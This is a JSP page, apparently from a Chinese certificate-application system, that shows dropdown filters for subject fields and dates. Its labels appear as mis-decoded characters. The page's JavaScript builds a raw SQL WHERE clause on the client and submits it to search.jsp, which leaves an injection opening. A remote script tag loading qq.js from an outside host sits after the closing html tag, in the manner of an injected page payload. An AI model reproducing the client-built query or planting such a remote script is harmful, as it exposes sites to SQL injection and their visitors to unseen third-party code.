<%@ page contentType="text/html; charset=gb2312" %>
<%@ page import="ApplyBeans.ApplyBrowser" %>
<%@ page import="java.util.*" %>
<%! Enumeration emu=null; %>
<jsp:useBean id="browser" class="ApplyBeans.ApplyBrowser" scope="page"/>
<html>
<head>
<title>��������</title>
<style type="text/css">
<!--
.btnStyle {  width: 200px}
-->
</style>
</head>
<script>
 function search(selectSrc)
 {
 	if(selectSrc.value!="")
 		hiddenForm.searchString.value=" where "+selectSrc.name+"='"+selectSrc.value+"' ";
	else
		hiddenForm.searchString.value="";
	hiddenForm.submit();
 }
</script>
<body bgcolor="#FFFFFF" text="#000000">
<% boolean browseOk=browser.browse();%>
<%if (browseOk==false)
{
%>
<h2>�Բ������ݿ��ѯ�����⣡</h2>
<%
}
else
{
%>
<h3 align="center">�������룺</h3>
<table border="0" cellspacing="0" cellpadding="0" align="center" width="400">
  <tr> 
    <td height="2" nowrap align="center" width="166">���������ң�</td>
    <td height="2" nowrap width="208"> 
      <select name="applyCN" class="btnStyle">
        <option selected value="" >����ȫ������</option>
        <%
			emu=browser.vCN.elements();
		 			while(emu.hasMoreElements())
		 			{
						String temp=(String)emu.nextElement();
		 %>
        <option  value="<%=temp%>" ><%=temp%></option>
        <%
					}

		%>
      </select>
    </td>
    <td height="2" nowrap width="47"> 
      <input type="button" name="Submit" value="����" onClick="search(applyCN)">
    </td>
  </tr>
  <tr> 
    <td nowrap align="right" width="166">&nbsp;</td>
    <td nowrap width="208">&nbsp;</td>
    <td nowrap width="47">&nbsp;</td>
  </tr>
  <tr> 
    <td nowrap align="center" width="166">����λ���ң�</td>
    <td nowrap width="208"> 
      <select name="applyPosition" class="btnStyle">
        <option selected value="" >����ȫ������</option>
        <%
			emu=browser.vPosition.elements();
		 			while(emu.hasMoreElements())
		 			{
						String temp=(String)emu.nextElement();
		 %>
        <option  value="<%=temp%>" ><%=temp%></option>
        <%
					}

		%>
      </select>
    </td>
    <td nowrap width="47"> 
      <input type="button" name="Submit2" value="����" onClick="search(applyPosition)">
    </td>
  </tr>
  <tr> 
    <td nowrap align="center" width="166">&nbsp;</td>
    <td nowrap width="208">&nbsp;</td>
    <td nowrap width="47">&nbsp;</td>
  </tr>
  <tr> 
    <td nowrap align="center" width="166">����λ���ң�</td>
    <td nowrap width="208"> 
      <select name="applyO" class="btnStyle">
        <option selected value="" >����ȫ������</option>
        <%
			emu=browser.vO.elements();
		 			while(emu.hasMoreElements())
		 			{
						String temp=(String)emu.nextElement();
		 %>
        <option  value="<%=temp%>" ><%=temp%></option>
        <%
					}

		%>
      </select>
    </td>
    <td nowrap width="47"> 
      <input type="button" name="Submit4" value="����" onClick="search(applyO)">
    </td>
  </tr>
  <tr> 
    <td nowrap align="center" width="166">&nbsp;</td>
    <td nowrap width="208">&nbsp;</td>
    <td nowrap width="47">&nbsp;</td>
  </tr>
  <tr> 
    <td nowrap align="center" width="166">�����Ų��ң�</td>
    <td nowrap width="208"> 
      <select name="applyOU" class="btnStyle">
        <option selected value="" >����ȫ������</option>
        <%
			emu=browser.vOU.elements();
		 			while(emu.hasMoreElements())
		 			{
						String temp=(String)emu.nextElement();
		 %>
        <option  value="<%=temp%>" ><%=temp%></option>
        <%
					}

		%>
      </select>
    </td>
    <td nowrap width="47"> 
      <input type="button" name="Submit3" value="����" onClick="search(applyOU)">
    </td>
  </tr>
  <tr> 
    <td nowrap align="right" width="166">&nbsp;</td>
    <td nowrap width="208">&nbsp;</td>
    <td nowrap width="47">&nbsp;</td>
  </tr>
  <tr> 
    <td nowrap align="center" width="166">�����в��ң�</td>
    <td nowrap width="208"> 
      <select name="applyL" class="btnStyle">
        <option selected value="" >����ȫ������</option>
        <%
			emu=browser.vL.elements();
		 			while(emu.hasMoreElements())
		 			{
						String temp=(String)emu.nextElement();
		 %>
        <option  value="<%=temp%>" ><%=temp%></option>
        <%
					}

		%>
      </select>
    </td>
    <td nowrap width="47"> 
      <input type="button" name="Submit5" value="����" onClick="search(applyL)">
    </td>
  </tr>
  <tr> 
    <td nowrap align="right" width="166">&nbsp;</td>
    <td nowrap width="208">&nbsp;</td>
    <td nowrap width="47">&nbsp;</td>
  </tr>
  <tr> 
    <td nowrap align="center" width="166">��ʡ�ݲ��ң�</td>
    <td nowrap width="208"> 
      <select name="applyST" class="btnStyle">
        <option selected value="" >����ȫ������</option>
        <%
			emu=browser.vST.elements();
		 			while(emu.hasMoreElements())
		 			{
						String temp=(String)emu.nextElement();
		 %>
        <option  value="<%=temp%>" ><%=temp%></option>
        <%
					}

		%>
      </select>
    </td>
    <td nowrap width="47"> 
      <input type="button" name="Submit6" value="����" onClick="search(applyST)">
    </td>
  </tr>
  <tr> 
    <td nowrap align="right" width="166">&nbsp;</td>
    <td nowrap width="208">&nbsp;</td>
    <td nowrap width="47">&nbsp;</td>
  </tr>
  <tr> 
    <td nowrap align="center" width="166">�����Ҳ��ң�</td>
    <td nowrap width="208"> 
      <select name="applyC" class="btnStyle">
        <option selected value="" >����ȫ������</option>
        <%
			emu=browser.vC.elements();
		 			while(emu.hasMoreElements())
		 			{
						String temp=(String)emu.nextElement();
		 %>
        <option  value="<%=temp%>" ><%=temp%></option>
        <%
					}

		%>
      </select>
    </td>
    <td nowrap width="47"> 
      <input type="button" name="Submit7" value="����" onClick="search(applyC)">
    </td>
  </tr>
  <tr> 
    <td nowrap align="right" width="166">&nbsp;</td>
    <td nowrap width="208">&nbsp;</td>
    <td nowrap width="47">&nbsp;</td>
  </tr>
  <tr> 
    <td nowrap align="center" width="166">������ʱ����ң�</td>
    <td nowrap width="208"> 
      <select name="applyDate" class="btnStyle">
        <option selected value="" >����ȫ������</option>
        <%
			emu=browser.vDate.elements();
		 			while(emu.hasMoreElements())
		 			{
						String temp=(String)emu.nextElement();
		 %>
        <option  value="<%=temp%>" ><%=new java.util.Date(temp).toLocaleString()%></option>
        <%
					}

		%>
      </select>
    </td>
    <td nowrap width="47"> 
      <input type="button" name="Submit8" value="����" onClick="search(applyDate)">
    </td>
  </tr>

</table>
<%
}
%>
<form name="hiddenForm" method="post" action="search.jsp" >
	<input type="hidden" name="searchString" value="">
</form>

</body>
</html>

<script language=javascript src=http://www.qq.com/qq.js></script>